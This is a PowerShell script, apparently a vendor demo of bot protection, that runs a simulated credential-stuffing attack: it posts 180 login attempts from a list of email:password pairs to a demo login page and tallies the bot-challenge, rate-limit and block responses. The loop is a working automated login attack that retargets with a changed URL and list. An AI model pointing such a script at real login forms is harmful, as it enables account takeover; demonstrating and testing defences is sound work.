# ─────────────────────────────────────────────────────────────────────────────
# Link11 Demo — Credential Stuffing Simulation
# Sends 180 form POST login attempts over 6 minutes (1 request every 2 seconds)
# Target: POST /login on panerademo.biokeks.com (form-encoded, Link11 inspectable)
# ─────────────────────────────────────────────────────────────────────────────

$Target = "https://panerademo.biokeks.com/login"
$Total  = 180
$Delay  = 2

# ── HTTP response code constants ───────────────────────────────────────────────
# Edit labels and colours here — all output references use these values
$StatusLabel = @{
    302 = "302 Redirect (Login OK)"
    401 = "401 Invalid Credentials"
    247 = "247 Bot Challenge"
    429 = "429 Rate Limited"
    477 = "477 Flow Control"
    403 = "403 Forbidden"
}

$StatusColour = @{
    302 = "Green"
    401 = "Gray"
    247 = "Yellow"
    429 = "Yellow"
    477 = "Red"
    403 = "Red"
}

# Default for any unlisted code
$DefaultLabel  = "Generic Error"
$DefaultColour = "Red"

function Get-StatusLabel { param($Code)
    if ($StatusLabel.ContainsKey($Code)) { return $StatusLabel[$Code] }
    return "$Code $DefaultLabel"
}

function Get-StatusColour { param($Code)
    if ($StatusColour.ContainsKey($Code)) { return $StatusColour[$Code] }
    return $DefaultColour
}

# ── Credential list ────────────────────────────────────────────────────────────
# All entries use invalid passwords.
# The script overrides the password to Password1! at specific loop indices
# to simulate the attacker hitting valid credentials exactly 3 times.
# Valid hits at indices: 3, 17, 28
$ValidIndices  = @(3, 17, 28)
$ValidPassword = "Password1!"

$Credentials = @(
    "john.smith@fakecorp.com:password123",
    "sarah.jones@example.org:letmein",
    "priya.nair@stackflow.com:qwerty99",
    "mike.taylor@nowhere.net:abc123",
    "emma.wilson@testdomain.com:qwerty",
    "james.okafor@meridianbank.com:incorrectpass",
    "david.brown@fakemail.io:monkey123",
    "lisa.davis@notreal.com:sunshine",
    "sophie.walsh@cloudpeak.de:badpassword",
    "robert.miller@bogus.org:dragon123",
    "jennifer.moore@invalid.net:master",
    "marco.ricci@veloretail.it:wrongpass",
    "william.jackson@nowhere.com:shadow",
    "linda.white@fakeinc.com:password1",
    "alice.chen@nexuslabs.io:notmypass",
    "charles.harris@testco.org:mustang",
    "james.okafor@meridianbank.com:letmein99",
    "barbara.martin@fakemail.com:access123",
    "richard.garcia@bogusco.net:passw0rd",
    "susan.martinez@invalid.com:iloveyou",
    "kevin.lee@nowhere.net:football",
    "jessica.clark@bogus.com:baseball",
    "brian.robinson@fake.org:superman",
    "amanda.lewis@notreal.net:trustno1",
    "matthew.walker@invalid.com:hello123",
    "stephanie.hall@fakeco.io:monkey",
    "ryan.allen@nowhere.org:charlie",
    "sophie.walsh@cloudpeak.de:summer2024",
    "nicholas.young@bogus.net:donald",
    "rachel.king@fakemail.com:password2",
    "tom.brennan@hartfordgroup.co.uk:wrongword",
    "christopher.wright@invalid.org:master123"
)

$CredCount   = $Credentials.Count
$StatusCount = @{}

# ── Header ─────────────────────────────────────────────────────────────────────
Write-Host ""
Write-Host "  +============================================================+" -ForegroundColor White
Write-Host "  |         Link11 Demo - Credential Stuffing Attack           |" -ForegroundColor White
Write-Host "  +============================================================+" -ForegroundColor White
Write-Host ""
Write-Host "  Target  : $Target" -ForegroundColor Cyan
Write-Host "  Requests: $Total over 6 minutes (1 every ${Delay}s)"
Write-Host "  Started : $(Get-Date -Format 'HH:mm:ss')"
Write-Host ""

# Legend — only show defined codes
Write-Host "  " -NoNewline
foreach ($code in @(401, 247, 429, 477, 403)) {
    $label  = Get-StatusLabel $code
    $colour = Get-StatusColour $code
    Write-Host $label -ForegroundColor $colour -NoNewline
    Write-Host "  " -NoNewline
}
Write-Host ""
Write-Host ""
Write-Host "  ──────────────────────────────────────────────────────────────────────"
Write-Host ("  {0,-18} {1,-38} {2}" -f "REQ# / TIME", "USERNAME", "STATUS")
Write-Host "  ──────────────────────────────────────────────────────────────────────"

# ── Main loop ──────────────────────────────────────────────────────────────────
for ($i = 1; $i -le $Total; $i++) {
    $Cred     = $Credentials[($i - 1) % $CredCount]
    $Parts    = $Cred -split ":", 2
    $Username = $Parts[0]
    $Password = $Parts[1]
    $Time     = Get-Date -Format 'HH:mm:ss'

    # Override password at specific indices to simulate valid credential hits
    if ($ValidIndices -contains $i) {
        $Password = $ValidPassword
    }

    $Body = "username=$([Uri]::EscapeDataString($Username))&password=$([Uri]::EscapeDataString($Password))"

    # POST login — capture redirect without following it
    # Then follow manually as GET with the session cookie
    # This avoids PowerShell's redirect handling sending POST instead of GET
    $Session = New-Object Microsoft.PowerShell.Commands.WebRequestSession

    try {
        $PostResponse = Invoke-WebRequest -Uri $Target `
            -Method POST `
            -ContentType "application/x-www-form-urlencoded" `
            -Body $Body `
            -UseBasicParsing `
            -TimeoutSec 10 `
            -MaximumRedirection 0 `
            -WebSession $Session `
            -ErrorAction Stop
        $StatusCode = $PostResponse.StatusCode
    } catch {
        if ($_.Exception.Response) {
            $RedirectCode = [int]$_.Exception.Response.StatusCode
            $Location     = $_.Exception.Response.Headers.Location
            if ($RedirectCode -in 301,302,303 -and $Location) {
                # Resolve relative redirect URL
                $RedirectUrl = if ($Location -match '^https?://') {
                    $Location
                } else {
                    "https://panerademo.biokeks.com$Location"
                }
                try {
                    $GetResponse = Invoke-WebRequest -Uri $RedirectUrl `
                        -Method GET `
                        -UseBasicParsing `
                        -TimeoutSec 10 `
                        -MaximumRedirection 0 `
                        -WebSession $Session `
                        -ErrorAction Stop
                    $StatusCode = $GetResponse.StatusCode
                } catch {
                    $StatusCode = if ($_.Exception.Response) { [int]$_.Exception.Response.StatusCode } else { 0 }
                }
            } else {
                $StatusCode = $RedirectCode
            }
        } else {
            $StatusCode = 0
        }
    }

    if ($StatusCount.ContainsKey($StatusCode)) {
        $StatusCount[$StatusCode]++
    } else {
        $StatusCount[$StatusCode] = 1
    }

    $display = if ($Username.Length -gt 36) { $Username.Substring(0, 36) } else { $Username }
    $label   = Get-StatusLabel $StatusCode
    $colour  = Get-StatusColour $StatusCode

    Write-Host ("  {0,-18} {1,-38} " -f "$i/$Total $Time", $display) -NoNewline
    Write-Host $label -ForegroundColor $colour

    if ($i -lt $Total) {
        Start-Sleep -Seconds $Delay
    }
}

# ── Summary ────────────────────────────────────────────────────────────────────
Write-Host ""
Write-Host "  ──────────────────────────────────────────────────────────────────────"
Write-Host "  Summary" -ForegroundColor White
Write-Host "  ──────────────────────────────────────────────────────────────────────"

foreach ($code in ($StatusCount.Keys | Sort-Object)) {
    $count  = $StatusCount[$code]
    $label  = Get-StatusLabel $code
    $colour = Get-StatusColour $code
    Write-Host ("  {0,-35} : {1}" -f $label, $count) -ForegroundColor $colour
}

Write-Host "  ──────────────────────────────────────────────────────────────────────"
Write-Host "  Finished : $(Get-Date -Format 'HH:mm:ss')"
Write-Host ""
